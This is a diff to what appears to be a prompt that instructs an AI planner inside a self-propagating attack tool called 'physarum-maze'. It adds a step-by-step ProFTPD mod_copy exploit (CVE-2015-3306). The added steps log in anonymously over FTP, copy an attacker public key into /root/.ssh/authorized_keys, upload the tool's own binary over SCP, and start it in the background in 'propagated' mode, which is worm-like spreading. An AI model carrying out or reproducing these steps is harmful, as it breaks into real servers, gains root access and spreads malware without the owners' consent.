@@ -173,10 +173,30 @@ SSH-FIRST PATH GUIDANCE (when port 22 is open on target):
 
 Use the wget single-step approach only when port 22 is absent from the ports list.
 
+── PROFTPD MOD_COPY INJECTION (CVE-2015-3306) ───────────────────────────────────
+SCOPE: the FtpModCopy action is an adapter for ProFTPD 1.3.5 with mod_copy loaded.
+Preconditions (all required): mod_copy enabled in proftpd.conf, FTP port reachable,
+process runs as root (write access to /root/.ssh/authorized_keys).
+
+When the CVE is CVE-2015-3306 (ProFTPD mod_copy), use:
+
+  FTP MOD_COPY PATH (when port 21 is open and CVE-2015-3306 is the top candidate):
+  Step 1 — FtpModCopy: inject ephemeral pubkey via STOR + SITE CPFR/CPTO.
+    port: 21
+    staging_path: \"/tmp/physarum_authorized_keys\"
+    dest_path: \"/root/.ssh/authorized_keys\"
+    The executor performs: anonymous login → PASV data channel → STOR pubkey
+    → SITE CPFR staging_path → SITE CPTO dest_path. No credentials in the plan.
+  Step 2 — ScpUpload: transfer physarum-maze binary (port 22 implicit).
+    local_path: \"__self__\"
+    remote_path: \"/tmp/physarum/physarum-maze\"
+  Step 3 — SshCommand: execute binary in background.
+    command: \"mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze && nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
+
 ── COMMON RULES ─────────────────────────────────────────────────────────────────────
 - Each CVE has its own endpoint, parameter, header, or protocol field — follow the injection
   class guidance above when the CVE matches (OGNL, deserialization, SSRF, etc.).
-- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, Custom (for non-HTTP).
+- Available actions: HttpPost, HttpGet, ScpUpload, SshCommand, FtpModCopy, Custom.
 - Multiple steps are allowed and encouraged for multi-phase CVEs.
 
 RESPONSE:
